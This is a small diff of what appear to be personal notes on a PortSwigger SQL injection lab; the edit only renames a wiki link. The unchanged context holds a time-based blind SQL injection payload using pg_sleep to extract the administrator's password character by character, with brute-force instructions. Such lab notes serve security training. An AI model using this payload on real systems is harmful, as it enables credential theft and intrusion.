@@ -35,7 +35,7 @@
 ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND  SUBSTRING(password,1,1) ='a') -- 
 ```
 
-> Similar to [[Lab 12]], brute force the password with the indices from 1-20 and the characters from a-z and 0-9.
+> Similar to [[Portswigger/SQL Injection/Lab 12]], brute force the password with the indices from 1-20 and the characters from a-z and 0-9.
 > Check the response recieved column, those with the delay have the correct values.
 
 1 - y
